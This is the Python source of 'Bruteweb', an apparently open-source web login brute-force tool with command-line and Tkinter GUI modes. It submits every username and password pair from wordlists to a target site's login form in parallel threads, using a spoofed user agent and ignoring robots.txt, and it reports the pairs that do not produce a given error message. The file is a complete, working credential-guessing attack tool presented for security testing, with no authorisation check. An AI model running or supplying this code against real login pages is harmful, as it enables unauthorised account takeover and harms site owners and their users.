import itertools
import time
import mechanize
import argparse
import threading
import signal
import sys
import os
import tkinter as tk
from tkinter import filedialog
from tkinter import ttk
import webbrowser
from urllib.parse import urlparse
from tkinter import messagebox

# Bruteweb
# by superjulien
# > https://github.com/Superjulien
# > https://framagit.org/Superjulien
# V0.995

version = "0.995"
window = None

class TextRedirector:
    def __init__(self, text_widget, tag="stdout"):
        self.text_widget = text_widget
        self.tag = tag
    def write(self, msg):
        self.text_widget.config(state=tk.NORMAL)
        self.text_widget.insert(tk.END, msg, (self.tag,))
        self.text_widget.see(tk.END)
        self.text_widget.config(state=tk.DISABLED)
    def flush(self):
        pass

def stop_brute_force():
    global stop_event
    stop_event.set()
    run_button.config(state=tk.NORMAL)

def signal_handler(sig, frame):
    global stop_event
    stop_event.set()
    print("Received Ctrl+C. Stopping...")

def validate_non_negative_float(value):
    f_value = float(value)
    if f_value < 0:
        raise argparse.ArgumentTypeError(f"{value} must be a non-negative float.")
    return f_value

def validate_positive_int(value):
    int_value = int(value)
    if int_value < 1:
        raise argparse.ArgumentTypeError(f"{value} must be a positive integer.")
    return int_value

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', type=str, nargs='?', default='', help="URL")
    parser.add_argument('username', type=str, nargs='?', default='', help="username list")
    parser.add_argument('password', type=str, nargs='?', default='', help="password list")
    parser.add_argument("error", type=str, nargs='?', default='', help="error message")
    parser.add_argument("-t", dest='time', action='store', type=validate_non_negative_float, default=0, help="time sleep m/s")
    parser.add_argument("-c", dest='header', action='store', type=str, default='',
                        help="custom user-agent, default:Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")
    parser.add_argument("-u", dest='usern', action='store', type=str, default='username', help="form for username, default:username" )
    parser.add_argument("-p", dest='passn', action='store', type=str, default='password', help="form for password, default:password" )
    parser.add_argument("-v", "--verbose", dest='verb', action='count', default=0,
                        help="Verbosity (between 1-2-3 occurrences with more leading to more "
                             "verbose logging). ALL=1, USER:PASS=2, USER:PASS+READ WEB=3")
    parser.add_argument("-n", dest='tasks', action='store', type=validate_positive_int, default=1, help="number of parallel tasks, default: 1")
    parser.add_argument("-g", "--gui", dest='gui', action='store_true', help="enable GUI mode")
    parser.add_argument("-a", "--all", dest="all_combinations", action="store_true", help="Try all combinations")
    return parser.parse_args()

def count_lines(file_path):
    count = 0
    with open(file_path, "r") as file:
        for _ in file:
            count += 1
    return count

def browse(file_entry):
    filename = filedialog.askopenfilename()
    file_entry.delete(0, tk.END)
    file_entry.insert(tk.END, filename)

def read_usernames(filename):
    with open(filename, "r") as user_file:
        for line in user_file:
            yield line.strip()

def read_passwords(filename):
    with open(filename, "r") as pass_file:
        for line in pass_file:
            yield line.strip()

def brute_force(host, username_file, password_file, error_message, args, verb, username_field, password_field):
    global stop_event
    combinations_tested = 0
    num_users = count_lines(username_file)
    num_passwords = count_lines(password_file)
    total_combinations = num_users * num_passwords
    if verb == 1:
        print(f" # Total combinations to test: {total_combinations}")
        print(f"")
        time.sleep(1)
    usernames = read_usernames(username_file)
    passwords = read_passwords(password_file)
    combinations = itertools.product(usernames, passwords)
    found_credentials = []
    stop_event = threading.Event()
    success_flag = [False]
    if not args.gui:
        error_message = args.error
    def process_thread(task_id):
        nonlocal combinations_tested
        for username, password in combinations:
            if stop_event.is_set():
                break
            result = brute_force_submit(host, username.strip(), password.strip(), args, verb, username_field, password_field, task_id, stop_event)
            if result is None:
                continue
            login_check, username, password = result
            if args.time > 0:
                time.sleep(args.time)
            if verb == 2:
                print(username, ":", password)
            if verb == 3:
                print("")
                print("####################")
                print("")
                print("1> Login : Password = ", username, ":", password)
                print("")
                print("2> Server response:")
                print("")
                print(login_check)
            if verb == 1:
                print("")
                print("####################")
                print("")
                print("1> Login : Password = ", username, ":", password)
                print("")
                print("2> Task id = ", task_id)
                print("")
                print("3> Server response:")
                print("")
                print(login_check)
            if ctrl(login_check, error_message, "0") == "0":
                success_flag[0] = True
                print("____________________")
                print("Task", task_id, "-", username, ":", password)
                print(login_check)
                found_credentials.append((username, password))
                if not args.all_combinations:
                    stop_event.set()
                    break
            combinations_tested += 1
    threads = []
    num_threads = args.tasks
    for task_id in range(num_threads):
        thread = threading.Thread(target=process_thread, args=(task_id,))
        thread.start()
        threads.append(thread)
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("Received Ctrl+C. Stopping...")
        stop_event.set()
        for thread in threads:
            thread.join()
    if verb == 1 and args.all_combinations:
        print(f"> Combinations tested: {combinations_tested}/{total_combinations}")
    if success_flag[0]:
        print("> Success")
        print("Valid login and password combinations:")
        for credentials in found_credentials:
            print(credentials)
    else:
        print("> Not found")

def brute_force_submit(host, username, password, args, verb, username_field, password_field, task_id, stop_event):
    br = mechanize.Browser()
    br.set_handle_robots(False)
    if args.header:
        br.addheaders = [("User-agent", args.header)]
    else:
        br.addheaders = [("User-agent",
                          "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]
    if verb == 1 and getattr(args, 'ctt', 1) == 1:
        print("User agent (Task {}): {}".format(task_id, str(br.addheaders)))
        time.sleep(2)
        args.ctt = 0
    try:
        sign_in = br.open(host)
    except Exception as e:
        print(f"Error opening the URL: {e}")
        return None
    br.select_form(nr=0)
    if len(username_field) or len(password_field) == 0:
        br["username"] = str(username)
        br["password"] = str(password)
    else:
        br[username_field] = str(username)
        br[password_field] = str(password)
    if stop_event.is_set():
        return None
    try:
        logged_in = br.submit()
        login_check = logged_in.read()
    except Exception as e:
        print(f"Error during form submission: {e}")
        return None
    return login_check, username, password

def ctrl(log, err, a):
    err = str(err)
    log = str(log)
    if int(log.find(err)) == -1:
        a = "0"
        return a
    else:
        a = "1"
        return a

def print_logo(window, args):
    logo = '''
         ____             __         _       __     __
        / __ )_______  __/ /____    | |     / /__  / /_
       / __  / ___/ / / / __/ _ \   | | /| / / _ \/ __ \\
      / /_/ / /  / /_/ / /_/  __/   | |/ |/ /  __/ /_/ /
     /_____/_/   \__,_/\__/\___/____|__/|__/\___/_.___/
                              /_____/
    '''
    if args.gui:
        logo_label = tk.Label(window, text=logo, justify="left", font=("Courier", 12))
        logo_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10)
    else :
        print(logo)

def print_version_comments(window, args):
    if not args.gui:
        print("Version "+version)

def quit_program():
    global window
    if window:
        window.destroy()

def restart_program():
    global window
    if window:
        window.destroy()
    main()

def help_menu():
    about_text = """\
    This program was created by SMITH001.

    License: GNU General Public License v3.0

    Version: {}

    This program is a brute-force tool for web security testing.

    This program is provided without any warranty.
    """.format(version)
    version_window = tk.Toplevel(window)
    version_window.title("About")
    about_label = tk.Label(version_window, text=about_text, justify="left")
    about_label.pack(padx=20, pady=10)

def open_github():
    webbrowser.open("https://github.com/Superjulien/Bruteweb")

def open_framagit():
    webbrowser.open("https://framagit.org/Superjulien/Bruteweb")

def info(args, host, username_file, password_file, error_message, usern_form, passn_form, time_value, tasks_value):
    if not args.gui:
        print("")
    print(" > URL used:", host)
    print(" > Username file path:", username_file)
    print(" > Password file path:", password_file)
    print(" > Error message:", error_message)
    print(" > User form:", args.usern)
    print(" > Password form:", args.passn)
    print(" > Timer used:", args.time)
    print(" > Number of parallel tasks:", args.tasks)
    print("")
    time.sleep(2)

def validurl(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def toggle_entry_state(entry_widget, checkbox_var):
    if checkbox_var.get():
        entry_widget.config(state="normal")
    else:
        entry_widget.config(state="disabled")

def validate_inputs(host, username_file, password_file, error_message, time_value, tasks_value, custom_agent, usern_form, passn_form):
    if not host:
        return "URL is missing."
    if not username_file:
        return "Username file is missing."
    if not password_file:
        return "Password file is missing."
    if not error_message:
        return "Error message is missing."
    if time_value is None:
        return "Time value is missing."
    if time_value < 0:
        return "Time cannot be negative."
    if tasks_value is None:
        return "Number of tasks is missing."
    if tasks_value <= 0:
        return "Number of tasks must be a positive value."
    if custom_agent is None or not custom_agent.strip():
        return "Custom User-Agent is missing."
    if usern_form is None or not usern_form.strip():
        return "Form field for Username is missing."
    if passn_form is None or not passn_form.strip():
        return "Form field for Password is missing."
    return None

def main():
    global window, stop_event, run_button
    args = parse_args()
    if args.gui:
        host = ''
        username_file = ''
        password_file = ''
        error_message = ''
        def set_verbosity(event):
            verbosity = verbosity_combobox.get()
            args.verb = int(verbosity)
        def run_brute_force():
            nonlocal host, username_file, password_file, error_message
            host = url_entry.get()
            username_file = username_entry.get()
            password_file = password_entry.get()
            error_message = error_entry.get()
            if not validurl(host):
                messagebox.showwarning("Input Error", "Invalid URL format. Please enter a valid URL.")
                return
            sys.stdout = TextRedirector(console_text, 'stdout')
            time_str = time_entry.get()
            tasks_str = tasks_entry.get()
            custom_agent = header_entry.get() if header_var.get() else 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13'
            usern_form = usern_entry.get() if usern_var.get() else 'username'
            passn_form = passn_entry.get() if passn_var.get() else 'password'
            time_value = 0
            tasks_value = 1
            try:
                if time_var.get():
                    time_value = float(time_str)
                if tasks_var.get():
                    tasks_value = int(tasks_str)
            except ValueError:
                if time_var.get() and not tasks_var.get():
                    messagebox.showwarning("Input Error", "Invalid time.")
                elif not time_var.get() and tasks_var.get():
                    messagebox.showwarning("Input Error", "Invalid number of tasks.")
                else:
                    messagebox.showwarning("Input Error", "Invalid time or number of tasks.")
                return
            validation_error = validate_inputs(host, username_file, password_file, error_message, time_value, tasks_value, custom_agent, usern_form, passn_form)
            if validation_error:
                messagebox.showwarning("Input Error", validation_error)
                return
            args.time = time_value
            args.header = custom_agent
            args.usern = usern_form
            args.passn = passn_form
            args.tasks = tasks_value
            args.all_combinations = all_combinations_var.get()
            run_button.config(state=tk.DISABLED)
            if args.verb == 1:
                info(args, host, username_file, password_file, error_message, usern_form, passn_form, time_value, tasks_value)
            threading.Thread(target=brute_force, args=(host, username_file, password_file, error_message, args, int(verbosity_combobox.get()), args.usern, args.passn)).start()
        window = tk.Tk()
        window.title("Brute Web GUI")
        menubar = tk.Menu(window)
        window.config(menu=menubar)
        fichier_menu = tk.Menu(menubar, tearoff=0)
        fichier_menu.add_command(label="Restart", command=restart_program)
        fichier_menu.add_command(label="Exit", command=quit_program)
        menubar.add_cascade(label="File", menu=fichier_menu)
        aide_menu = tk.Menu(menubar, tearoff=0)
        aide_menu.add_command(label="About", command=help_menu)
        aide_menu.add_command(label="GitHub", command=open_github)
        aide_menu.add_command(label="Framagit", command=open_framagit)
        menubar.add_cascade(label="Help", menu=aide_menu)
        url_label = tk.Label(window, text="URL:")
        url_label.grid(row=1, column=0)
        url_entry = tk.Entry(window)
        url_entry.grid(row=1, column=1)
        url_entry.insert(tk.END, host)
        username_label = tk.Label(window, text="Username file:")
        username_label.grid(row=2, column=0)
        username_entry = tk.Entry(window)
        username_entry.grid(row=2, column=1)
        username_entry.insert(tk.END, username_file)
        password_label = tk.Label(window, text="Password file:")
        password_label.grid(row=3, column=0)
        password_entry = tk.Entry(window)
        password_entry.grid(row=3, column=1)
        password_entry.insert(tk.END, password_file)
        error_label = tk.Label(window, text="Error message:")
        error_label.grid(row=4, column=0)
        error_entry = tk.Entry(window)
        error_entry.grid(row=4, column=1)
        error_entry.insert(tk.END, error_message)
        verbosity_label = tk.Label(window, text="Verbosity:")
        verbosity_label.grid(row=12, column=0)
        verbosity_combobox = tk.ttk.Combobox(window, values=["0", "1", "2", "3"], state="readonly")
        verbosity_combobox.grid(row=12, column=1, padx=(10, 0))
        verbosity_combobox.current(0)
        verbosity_combobox.bind("<<ComboboxSelected>>", set_verbosity)
        username_browse_button = tk.Button(window, text="Browse", command=lambda: browse(username_entry))
        username_browse_button.grid(row=2, column=2, padx=(10, 0))
        password_browse_button = tk.Button(window, text="Browse", command=lambda: browse(password_entry))
        password_browse_button.grid(row=3, column=2, padx=(10, 0))
        time_label = tk.Label(window, text="Time (sleep m/s):")
        time_label.grid(row=6, column=0)
        time_var = tk.BooleanVar()
        time_var.set(False)
        time_checkbox = tk.Checkbutton(window, variable=time_var)
        time_checkbox.config(command=lambda: toggle_entry_state(time_entry, time_var))
        time_checkbox.grid(row=6, column=2, sticky=tk.W)
        time_entry = tk.Entry(window)
        time_entry.grid(row=6, column=1)
        time_entry.insert(tk.END, '0')
        toggle_entry_state(time_entry, time_var)
        header_label = tk.Label(window, text="Custom User-Agent:")
        header_label.grid(row=7, column=0)
        header_var = tk.BooleanVar()
        header_var.set(False)
        header_checkbox = tk.Checkbutton(window, variable=header_var)
        header_checkbox.config(command=lambda: toggle_entry_state(header_entry, header_var))
        header_checkbox.grid(row=7, column=2, sticky=tk.W)
        header_entry = tk.Entry(window)
        header_entry.grid(row=7, column=1)
        header_entry.insert(tk.END, 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13')
        toggle_entry_state(header_entry, header_var)
        tk.Label(window, text="").grid(row=5, column=0)
        tk.Label(window, text="").grid(row=11, column=0)
        usern_label = tk.Label(window, text="Form for Username:")
        usern_label.grid(row=8, column=0)
        usern_var = tk.BooleanVar()
        usern_var.set(False)
        usern_checkbox = tk.Checkbutton(window, variable=usern_var)
        usern_checkbox.config(command=lambda: toggle_entry_state(usern_entry, usern_var))
        usern_checkbox.grid(row=8, column=2, sticky=tk.W)
        usern_entry = tk.Entry(window)
        usern_entry.grid(row=8, column=1)
        usern_entry.insert(tk.END, 'username')
        toggle_entry_state(usern_entry, usern_var)
        passn_label = tk.Label(window, text="Form for Password:")
        passn_label.grid(row=9, column=0)
        passn_var = tk.BooleanVar()
        passn_var.set(False)
        passn_checkbox = tk.Checkbutton(window, variable=passn_var)
        passn_checkbox.config(command=lambda: toggle_entry_state(passn_entry, passn_var))
        passn_checkbox.grid(row=9, column=2, sticky=tk.W)
        passn_entry = tk.Entry(window)
        passn_entry.grid(row=9, column=1)
        passn_entry.insert(tk.END, 'password')
        toggle_entry_state(passn_entry, passn_var)
        tasks_label = tk.Label(window, text="Number of Parallel Tasks:")
        tasks_label.grid(row=10, column=0)
        tasks_var = tk.BooleanVar()
        tasks_var.set(False)
        tasks_checkbox = tk.Checkbutton(window, variable=tasks_var)
        tasks_checkbox.config(command=lambda: toggle_entry_state(tasks_entry, tasks_var))
        tasks_checkbox.grid(row=10, column=2, sticky=tk.W)
        tasks_entry = tk.Entry(window)
        tasks_entry.grid(row=10, column=1)
        tasks_entry.insert(tk.END, '1')
        toggle_entry_state(tasks_entry, tasks_var)
        run_button = tk.Button(window, text="Run", command=run_brute_force)
        run_button.grid(row=13, column=0, columnspan=2, pady=10)
        stop_button = tk.Button(window, text="Stop", command=stop_brute_force)
        stop_button.grid(row=13, column=1, pady=10)
        all_combinations_label = tk.Label(window, text="Try all combinations:")
        all_combinations_label.grid(row=11, column=0)
        all_combinations_var = tk.BooleanVar()
        all_combinations_checkbox = tk.Checkbutton(window, variable=all_combinations_var)
        all_combinations_checkbox.grid(row=11, column=2, sticky=tk.W)
        print_logo(window, args)
        print_version_comments(window, args)
        console_text = tk.Text(window, wrap=tk.WORD, state=tk.DISABLED)
        console_text.grid(row=1, column=3, rowspan=13, padx=10, pady=10)
        sys.stdout = TextRedirector(console_text, 'stdout')
        window.mainloop()
    else:
        host = args.url
        username_file = args.username
        password_file = args.password
        error_message = args.error
        if not args.url or not args.username or not args.password or not args.error:
            print("Error: Mandatory arguments are missing.")
            return
        if not validurl(args.url):
            print("Error: Invalid URL format. Please enter a valid URL.")
            return
        print_logo(None, args)
        print_version_comments(None, args)
        print("CTRL+C for exit.")
        time.sleep(4)
        if args.verb == 1:
            info(args, host, username_file, password_file, error_message, args.usern, args.passn, args.time, args.tasks)
        signal.signal(signal.SIGINT, signal_handler)
        brute_force(args.url, args.username, args.password, args.error, args, args.verb, args.usern, args.passn)

if __name__ == "__main__":
    main()
